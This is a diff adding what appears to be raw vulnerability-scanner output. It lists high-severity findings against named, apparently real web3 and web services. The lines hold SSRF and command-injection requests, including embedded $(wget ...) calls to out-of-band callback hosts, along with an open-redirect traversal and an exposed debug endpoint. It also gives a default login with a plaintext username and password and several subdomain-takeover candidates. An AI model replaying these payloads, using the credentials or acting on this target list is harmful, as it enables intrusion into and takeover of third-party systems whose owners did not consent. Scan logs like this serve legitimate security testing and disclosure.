@@ -1,0 +1,22 @@
+[CVE-2017-0929] [http] [high] https://ddocs-indexer.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://d9c4gj0226q3ehsrcl0gcmpjrpkmge9jj.oast.me
+[CVE-2017-18638] [http] [high] https://ddocs-indexer.fileverse.io/composer/send_email?to=JOAT@xABQ&url=http://d9c4gj0226q3ehsrcl0gbhrzx4oj7hyuz.oast.me
+[CVE-2018-1000600] [http] [high] https://ddocs-indexer.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://d9c4gj0226q3ehsrcl0ghq4eurmqzuar9.oast.me
+[CVE-2019-11248] [http] [high] https://influx.instadapp.io/debug/pprof/
+[CVE-2021-33544] [http] [high] https://ddocs-indexer.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9c4gj0226q3ehsrcl0gjc3gfkyw419mo.oast.me)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2021-33544] [http] [high] https://identity-v1.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9c55cdtsdp3ckgli8bgfqwkbwywwjjaz.oast.online)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana-explore.dev.hubbleprotocol.io/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana-explore.hubbleprotocol.io/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-55184] [http] [high] https://app.exponent.finance/en
+[CVE-2025-55184] [http] [high] https://app.grass.io
+[CVE-2025-55184] [http] [high] https://manage-vault.exponent.finance
+[CVE-2025-55184] [http] [high] https://sale.harmonix.fi
+[CVE-2025-55184] [http] [high] https://sale.sandbox.nonprod.harmonix.fi
+[apache-casbin-mcp-gateway-default-login] [http] [high] https://feedback.hop.exchange/login [password="password456",username="bob"]
+[aws-bucket-takeover] [http] [high] https://launchpad.holdstation.com ["berastarter.holdstation.com"]
+[aws-bucket-takeover] [http] [high] https://memberships.fewcha.app ["memberships.fewcha.app"]
+[aws-bucket-takeover] [http] [high] https://zkstarter.holdstation.com ["launchpad.holdstation.com2"]
+[framer-takeover] [http] [high] https://blog.exponent.finance ["sites.framer.app"]
+[framer-takeover] [http] [high] https://snowflake.flipsidecrypto.xyz ["magnificent-balance-420911.framer.app"]
+[framer-takeover] [http] [high] https://www.blog.exponent.finance ["sites.framer.app"]
+[github-takeover] [http] [high] https://evmos.org
+[github-takeover] [http] [high] https://swayapps.fuel.network
